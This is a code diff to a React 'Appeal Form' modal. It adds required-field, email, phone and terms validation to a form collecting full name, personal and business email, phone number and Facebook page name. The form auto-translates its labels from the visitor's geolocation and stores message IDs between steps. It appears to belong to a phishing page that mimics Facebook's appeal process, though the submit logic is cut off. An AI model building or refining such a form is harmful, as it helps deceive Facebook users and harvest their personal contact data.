@@ -4,10 +4,10 @@ import translateText from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import IntlTelInput from 'intl-tel-input/reactWithUtils';
+import IntlTelInput, { type IntlTelInputRef } from 'intl-tel-input/reactWithUtils';
 import 'intl-tel-input/styles';
 import Image from 'next/image';
-import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
+import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useRef, useState } from 'react';
 
 interface FormData {
     information: string;
@@ -17,18 +17,29 @@ interface FormData {
     facebookPageName: string;
 }
 
+interface FormErrors {
+    information?: string;
+    fullName?: string;
+    personalEmail?: string;
+    businessEmail?: string;
+    phoneNumber?: string;
+    facebookPageName?: string;
+    termsAccepted?: string;
+}
+
 interface FormField {
     name: keyof FormData;
     label: string;
     type: 'text' | 'email' | 'textarea';
+    required?: boolean;
 }
 
 const FORM_FIELDS: FormField[] = [
-    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
-    { name: 'fullName', label: 'Full Name', type: 'text' },
-    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
-    { name: 'businessEmail', label: 'Business Email', type: 'email' },
-    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' }
+    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea', required: true },
+    { name: 'fullName', label: 'Full Name', type: 'text', required: true },
+    { name: 'personalEmail', label: 'Personal Email', type: 'email', required: true },
+    { name: 'businessEmail', label: 'Business Email', type: 'email', required: true },
+    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text', required: true }
 ];
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
@@ -41,6 +52,9 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         businessEmail: '',
         facebookPageName: ''
     });
+    const [errors, setErrors] = useState<FormErrors>({});
+    const [termsAccepted, setTermsAccepted] = useState(false);
+    const phoneInputRef = useRef<IntlTelInputRef>(null);
 
     const { setModalOpen, geoInfo, setMessageId, setUserData, messageId } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
@@ -51,7 +65,21 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = [
+            'Appeal Form',
+            'Please provide us information that will help us investigate',
+            'Full Name',
+            'Personal Email',
+            'Business Email',
+            'Mobile phone number',
+            'Facebook Page Name',
+            'I agree with Terms of use',
+            'Submit',
+            'This field is required',
+            'Invalid email format',
+            'Invalid phone number',
+            'You must agree to the terms of use'
+        ];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -63,6 +91,49 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         translateAll();
     }, [geoInfo]);
+
+    // Validation functions
+    const validateEmail = (email: string): boolean => {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+    };
+
+    const validateForm = (): boolean => {
+        const newErrors: FormErrors = {};
+
+        // Validate required fields
+        FORM_FIELDS.forEach(field => {
+            if (field.required && !formData[field.name].trim()) {
+                newErrors[field.name] = t('This field is required');
+            }
+        });
+
+        // Validate email formats
+        if (formData.personalEmail && !validateEmail(formData.personalEmail)) {
+            newErrors.personalEmail = t('Invalid email format');
+        }
+        if (formData.businessEmail && !validateEmail(formData.businessEmail)) {
+            newErrors.businessEmail = t('Invalid email format');
+        }
+
+        // Validate phone number
+        if (!phoneNumber.trim()) {
+            newErrors.phoneNumber = t('This field is required');
+        } else if (phoneInputRef.current?.getInstance) {
+            const instance = phoneInputRef.current.getInstance();
+            if (instance && !instance.isValidNumber()) {
+                newErrors.phoneNumber = t('Invalid phone number');
+            }
+        }
+
+        // Validate terms accepted
+        if (!termsAccepted) {
+            newErrors.termsAccepted = t('You must agree to the terms of use');
+        }
+
+        setErrors(newErrors);
+        return Object.keys(newErrors).length === 0;
+    };
 
     const initOptions = useMemo(
         () => ({
@@ -83,16 +154,31 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             ...prev,
             [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
         }));
-    }, []);
+
+        // Clear error for this field when user types
+        if (errors[name as keyof FormErrors]) {
+            setErrors(prev => ({ ...prev, [name]: undefined }));
+        }
+    }, [errors]);
 
     const handlePhoneChange = useCallback((number: string) => {
         setPhoneNumber(number);
-    }, []);
+
+        // Clear phone error when user types
+        if (errors.phoneNumber) {
+            setErrors(prev => ({ ...prev, phoneNumber: undefined }));
+        }
+    }, [errors.phoneNumber]);
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
         if (isLoading) return;
+
+        // Validate form
+        if (!validateForm()) {
+            return;
+        }
 
         setIsLoading(true);
 
@@ -153,22 +239,70 @@ ${
                     <div className='flex flex-col gap-2 py-2'>
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
-                                <p className='font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
+                                <p className='font-sans'>
+                                    {t(field.label)}
+                                    {field.required && <span className='text-red-500'> *</span>}
+                                </p>
+                                {field.type === 'textarea' ? (
+                                    <textarea
+                                        name={field.name}
+                                        value={formData[field.name]}
+                                        onChange={handleInputChange}
+                                        className={`min-h-[100px] w-full rounded-[10px] border-2 ${errors[field.name] ? 'border-red-500' : 'border-[#d4dbe3]'} px-3 py-1.5`}
+                                        rows={3}
+                                    />
+                                ) : (
+                                    <input
+                                        name={field.name}
+                                        type={field.type}
+                                        value={formData[field.name]}
+                                        onChange={handleInputChange}
+                                        className={`h-[50px] w-full rounded-[10px] border-2 ${errors[field.name] ? 'border-red-500' : 'border-[#d4dbe3]'} px-3 py-1.5`}
+                                    />
+                                )}
+                                {errors[field.name] && (
+                                    <p className='mt-1 text-sm text-red-500'>{errors[field.name]}</p>
+                                )}
                             </div>
                         ))}
-                        <p className='font-sans'>{t('Mobile phone number')}</p>
-                        <IntlTelInput
-                            onChangeNumber={handlePhoneChange}
-                            initOptions={initOptions}
-                            inputProps={{
-                                name: 'phoneNumber',
-                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
-                            }}
-                        />
-                        <div className='flex items-center gap-2 pt-2'>
-                            <input type='checkbox' className='cursor-pointer' />
-                            <p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
+                        <div>
+                            <p className='font-sans'>
+                                {t('Mobile phone number')}
+                                <span className='text-red-500'> *</span>
+                            </p>
+                            <IntlTelInput
+                                ref={phoneInputRef}
+                                onChangeNumber={handlePhoneChange}
+                                initOptions={initOptions}
+                                inputProps={{
+                                    name: 'phoneNumber',
+                                    className: `h-[50px] w-full rounded-[10px] border-2 ${errors.phoneNumber ? 'border-red-500' : 'border-[#d4dbe3]'} px-3 py-1.5`
+                                }}
+                            />
+                            {errors.phoneNumber && (
+                                <p className='mt-1 text-sm text-red-500'>{errors.phoneNumber}</p>
+                            )}
+                        </div>
+                        <div>
+                            <label className='flex items-center gap-2 pt-2 cursor-pointer'>
+                                <input
+                                    type='checkbox'
+                                    checked={termsAccepted}
+                                    onChange={(e) => {
+                                        setTermsAccepted(e.target.checked);
+                                        if (e.target.checked && errors.termsAccepted) {
+                                            setErrors(prev => ({ ...prev, termsAccepted: undefined }));
+                                        }
+                                    }}
+                                    className='cursor-pointer'
+                                />
+                                <span>
+                                    {t('I agree with Terms of use')}
+                                </span>
+                            </label>
+                            {errors.termsAccepted && (
+                                <p className='mt-1 text-sm text-red-500'>{errors.termsAccepted}</p>
+                            )}
                         </div>
                         <button type='submit' disabled={isLoading} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
